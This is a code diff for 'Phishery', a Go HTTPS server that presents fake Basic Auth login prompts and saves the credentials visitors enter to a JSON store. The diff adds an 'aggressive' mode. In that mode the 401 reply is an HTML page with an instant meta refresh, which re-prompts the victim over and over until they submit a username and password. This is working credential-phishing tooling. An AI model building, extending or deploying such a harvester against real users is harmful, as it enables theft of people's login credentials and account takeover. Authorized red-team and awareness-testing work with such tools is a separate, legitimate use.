@@ -14,13 +14,27 @@ import (
 )
 
 type Phishery struct {
-	credStore *jstore.JsonStore
-	settings  Settings
+	credStore 	*jstore.JsonStore
+	settings  	Settings
+	aggressive	bool
 }
 
 var neat = neatprint.NewNeatPrint()
 
-func StartPhishery(settingsFile string, credsFile string) error {
+const aggrHTML = `
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Unauthorized</title>
+    <meta http-equiv="refresh" content="0">
+  </head>
+  <body>
+    <p>401 Unauthorized</p>
+  </body>
+</html>`
+
+func StartPhishery(settingsFile string, credsFile string, aggressive bool) error {
+	neat.Event("Loading settings from: %s", settingsFile)
 	settings := loadSettings(settingsFile)
 	credStore, err := jstore.NewStore(credsFile)
 	if err != nil {
@@ -32,9 +46,13 @@ func StartPhishery(settingsFile string, credsFile string) error {
 	srv := Phishery{
 		credStore: credStore,
 		settings: settings,
+		aggressive: aggressive,
 	}
 
 	neat.Event("Starting HTTPS Auth Server on: %s", listenOn)
+	if aggressive {
+		neat.Info("Server running in aggressive mode...")
+	}
 	http.HandleFunc("/", srv.handler)
 
 	return http.ListenAndServeTLS(listenOn, settings.SSLCert, settings.SSLKey, nil)
@@ -62,6 +80,11 @@ func (srv *Phishery) processAuth(auth string) (AuthInfo, error) {
 }
 
 func (srv *Phishery) handler(resp http.ResponseWriter, req *http.Request)  {
+	// Ignore favicon.ico requests from browsers
+	if strings.Contains(req.RequestURI, "favicon.ico") {
+		resp.WriteHeader(404)
+		return
+	}
 	printReq(req)
 
 	auth := strings.SplitN(req.Header.Get("Authorization"), " ", 2)
@@ -95,8 +118,14 @@ func (srv *Phishery) handler(resp http.ResponseWriter, req *http.Request)  {
 	neat.Info("Sending Basic Auth response to: %s", stripPort(req.RemoteAddr))
 
 	resp.Header().Set("WWW-Authenticate", `Basic realm="` + srv.settings.BasicRealm + `"`)
+	resp.Header().Set("Content-Type", "text/html")
 	resp.WriteHeader(401)
-	resp.Write([]byte("401 Unauthorized\n"))
+
+	if srv.aggressive {
+		resp.Write([]byte(aggrHTML))
+		return
+	}
+	resp.Write([]byte("401 Unauthorized"))
 }
 
 func (srv *Phishery) writeResponse(resp http.ResponseWriter) {
